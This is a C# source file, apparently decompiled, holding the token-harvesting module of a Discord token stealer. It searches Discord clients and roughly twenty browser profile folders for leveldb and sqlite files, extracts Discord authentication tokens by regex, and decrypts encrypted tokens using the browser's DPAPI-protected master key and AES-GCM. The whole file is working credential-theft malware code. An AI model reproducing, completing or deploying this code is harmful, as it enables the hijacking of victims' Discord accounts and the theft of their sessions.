using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SHARP
{
    internal class dst
    {
      private static List<DiscordAccountFormat> _accounts;
      private static string RoamingPath;
      private static string LocalAppDataPath = Help.LocalData;

      static dst()
      {
        dst.RoamingPath = Help.AppData;
        dst._accounts = new List<DiscordAccountFormat>();
      }

      internal static async Task<DiscordAccountFormat[]> GetAccounts()
      {
        await dst.Run();
        return dst._accounts.ToArray();
      }

      private static async Task Run()
      {
        dst._accounts.Clear();
        List<Task> taskList = new List<Task>();
        foreach (KeyValuePair<string, string> keyValuePair in new Dictionary<string, string>()
        {
          {
            "Discord",
            Path.Combine(dst.RoamingPath, "discord")
          },
          {
            "Discord Canary",
            Path.Combine(dst.RoamingPath, "discordcanary")
          },
          {
            "Lightcord",
            Path.Combine(dst.RoamingPath, "Lightcord")
          },
          {
            "Discord PTB",
            Path.Combine(dst.RoamingPath, "discordptb")
          },
          {
            "Opera",
            Path.Combine(dst.RoamingPath, "Opera Software", "Opera Stable")
          },
          {
            "Opera GX",
            Path.Combine(dst.RoamingPath, "Opera Software", "Opera GX Stable")
          },
          {
            "Amigo",
            Path.Combine(dst.LocalAppDataPath, "Amigo", "User Data")
          },
          {
            "Torch",
            Path.Combine(dst.LocalAppDataPath, "Torch", "User Data")
          },
          {
            "Kometa",
            Path.Combine(dst.LocalAppDataPath, "Kometa", "User Data")
          },
          {
            "Orbitum",
            Path.Combine(dst.LocalAppDataPath, "Orbitum", "User Data")
          },
          {
            "CentBrowse",
            Path.Combine(dst.LocalAppDataPath, "CentBrowser", "User Data")
          },
          {
            "7Sta",
            Path.Combine(dst.LocalAppDataPath, "7Star", "7Star", "User Data")
          },
          {
            "Sputnik",
            Path.Combine(dst.LocalAppDataPath, "Sputnik", "Sputnik", "User Data")
          },
          {
            "Vivaldi",
            Path.Combine(dst.LocalAppDataPath, "Vivaldi", "User Data")
          },
          {
            "Chrome SxS",
            Path.Combine(dst.LocalAppDataPath, "Google", "Chrome SxS", "User Data")
          },
          {
            "Chrome",
            Path.Combine(dst.LocalAppDataPath, "Google", "Chrome", "User Data")
          },
          {
            "FireFox",
            Path.Combine(dst.RoamingPath, "Mozilla", "Firefox", "Profiles")
          },
          {
            "Epic Privacy Browse",
            Path.Combine(dst.LocalAppDataPath, "Epic Privacy Browser", "User Data")
          },
          {
            "Microsoft Edge",
            Path.Combine(dst.LocalAppDataPath, "Microsoft", "Edge", "User Data")
          },
          {
            "Uran",
            Path.Combine(dst.LocalAppDataPath, "uCozMedia", "Uran", "User Data")
          },
          {
            "Yandex",
            Path.Combine(dst.LocalAppDataPath, "Yandex", "YandexBrowser", "User Data")
          },
          {
            "Brave",
            Path.Combine(dst.LocalAppDataPath, "BraveSoftware", "Brave-Browser", "User Data")
          },
          {
            "Iridium",
            Path.Combine(dst.LocalAppDataPath, "Iridium", "User Data")
          }
        })
        {
          if (Directory.Exists(keyValuePair.Value))
          {
            if (keyValuePair.Key == "Firefox")
            {
              taskList.Add(dst.FireFoxMethod(keyValuePair.Value));
            }
            else
            {
              taskList.Add(dst.MethodA(keyValuePair.Value));
              taskList.Add(dst.MethodB(keyValuePair.Value));
            }
          }
        }
        await Task.WhenAll((IEnumerable<Task>) taskList);
        await dst.RemoveDub();
      }

      private static async Task MethodA(string path)
      {
        string[] allowedExtentions = new string[2]
        {
          ".log",
          ".ldb"
        };
        Regex regex = new Regex("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", RegexOptions.Compiled);
        List<Task> processes = new List<Task>();
        List<string> obtainedTokens = new List<string>();
        string[] strArray1 = await Task.Run<string[]>((Func<string[]>) (() => Directory.GetDirectories(path, "leveldb", SearchOption.AllDirectories)));
        for (int index1 = 0; index1 < strArray1.Length; ++index1)
        {
          string[] strArray2 = ((IEnumerable<string>) Directory.GetFiles(strArray1[index1], "*", SearchOption.TopDirectoryOnly)).Where<string>((Func<string, bool>) (file => ((IEnumerable<string>) allowedExtentions).Contains<string>(Path.GetExtension(file)))).ToArray<string>();
          for (int index2 = 0; index2 < strArray2.Length; ++index2)
          {
            string path1 = strArray2[index2];
            try
            {
              string endAsync;
              using (FileStream fs = new FileStream(path1, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
              {
                using (StreamReader reader = new StreamReader((Stream) fs))
                  endAsync = await reader.ReadToEndAsync();
              }
              if (!string.IsNullOrWhiteSpace(endAsync))
              {
                foreach (Capture match in regex.Matches(endAsync))
                {
                  string token = match.Value;
                  if (!obtainedTokens.Contains(token))
                  {
                    processes.Add(dst.AddAccount(token));
                    obtainedTokens.Add(token);
                  }
                }
              }
            }
            catch (Exception ex)
            {
              Console.WriteLine((object) ex);
            }
          }
          strArray2 = (string[]) null;
        }
        strArray1 = (string[]) null;
        await Task.WhenAll((IEnumerable<Task>) processes);
        regex = (Regex) null;
        processes = (List<Task>) null;
        obtainedTokens = (List<string>) null;
      }

      private static async Task MethodB(string path)
      {
        string[] allowedExtentions = new string[2]
        {
          ".log",
          ".ldb"
        };
        Regex regex = new Regex("dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\"]*", RegexOptions.Compiled);
        List<Task> processes = new List<Task>();
        List<string> obtainedTokens = new List<string>();
        string path1 = Path.Combine(path, "Local State");
        string levelDbPath = Path.Combine(path, "Local Storage", "leveldb");
        if (File.Exists(path1) && Directory.Exists(levelDbPath))
        {
          try
          {
            string str = File.ReadAllText(path1);
            int num1 = str.IndexOf("\"os_crypt\":");
            int num2 = str.IndexOf("\"", num1 + 12);
            byte[] key = ((IEnumerable<byte>) Convert.FromBase64String(str.Substring(num1 + 12, num2 - num1 - 12).Split(':')[1].Trim('"'))).Skip<byte>(5).ToArray<byte>();
            foreach (string path2 in await Task.Run<string[]>((Func<string[]>) (() => ((IEnumerable<string>) Directory.GetFiles(levelDbPath, "*", SearchOption.TopDirectoryOnly)).Where<string>((Func<string, bool>) (file => ((IEnumerable<string>) allowedExtentions).Contains<string>(Path.GetExtension(file)))).ToArray<string>())))
            {
              string input = File.ReadAllText(path2);
              if (!string.IsNullOrWhiteSpace(input))
              {
                foreach (Capture match in regex.Matches(input))
                {
                  string source = match.Value;
                  if (source.EndsWith("\\"))
                    source = source.Take<char>(source.Length - 1).ToString();
                  string token = dst.DecryptTokenMethodB(Convert.FromBase64String(source.Split(new string[1]
                  {
                    "dQw4w9WgXcQ:"
                  }, StringSplitOptions.None)[1]), key);
                  if (!obtainedTokens.Contains(token) && !string.IsNullOrWhiteSpace(token))
                  {
                    processes.Add(dst.AddAccount(token));
                    obtainedTokens.Add(token);
                  }
                }
              }
            }
            key = (byte[]) null;
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        await Task.WhenAll((IEnumerable<Task>) processes);
        regex = (Regex) null;
        processes = (List<Task>) null;
        obtainedTokens = (List<string>) null;
      }

      private static async Task FireFoxMethod(string path)
      {
        List<Task> processes = new List<Task>();
        List<string> obtainedTokens = new List<string>();
        Regex regex = new Regex("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", RegexOptions.Compiled);
        string[] strArray = await Task.Run<string[]>((Func<string[]>) (() => Directory.GetFiles(path, "*.sqlite", SearchOption.AllDirectories)));
        for (int index = 0; index < strArray.Length; ++index)
        {
          string path1 = strArray[index];
          try
          {
            string endAsync;
            using (FileStream fs = new FileStream(path1, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
              using (StreamReader reader = new StreamReader((Stream) fs))
                endAsync = await reader.ReadToEndAsync();
            }
            if (!string.IsNullOrWhiteSpace(endAsync))
            {
              foreach (Capture match in regex.Matches(endAsync))
              {
                string token = match.Value;
                if (!obtainedTokens.Contains(token) && !string.IsNullOrWhiteSpace(token))
                {
                  processes.Add(dst.AddAccount(token));
                  obtainedTokens.Add(token);
                }
              }
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
        }
        strArray = (string[]) null;
        await Task.WhenAll((IEnumerable<Task>) processes);
        processes = (List<Task>) null;
        obtainedTokens = (List<string>) null;
        regex = (Regex) null;
      }

      private static string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
      {
        try
        {
          byte[] array1 = ((IEnumerable<byte>) buffer).Skip<byte>(15).ToArray<byte>();
          byte[] key = ProtectedData.Unprotect(protectedKey, (byte[]) null, DataProtectionScope.CurrentUser);
          byte[] array2 = ((IEnumerable<byte>) buffer).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
          byte[] array3 = ((IEnumerable<byte>) array1).Skip<byte>(array1.Length - 16 /*0x10*/).ToArray<byte>();
          byte[] array4 = ((IEnumerable<byte>) array1).Take<byte>(array1.Length - array3.Length).ToArray<byte>();
          return Encoding.UTF8.GetString(new AesGcm().Decrypt(key, array2, (byte[]) null, array4, array3));
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
          return string.Empty;
        }
      }

      private static async Task AddAccount(string token)
      {
        dst._accounts.Add(new DiscordAccountFormat(token));
      }

      private static async Task RemoveDub()
      {
        dst._accounts.Distinct<DiscordAccountFormat>().ToList<DiscordAccountFormat>();
      }
    }
}
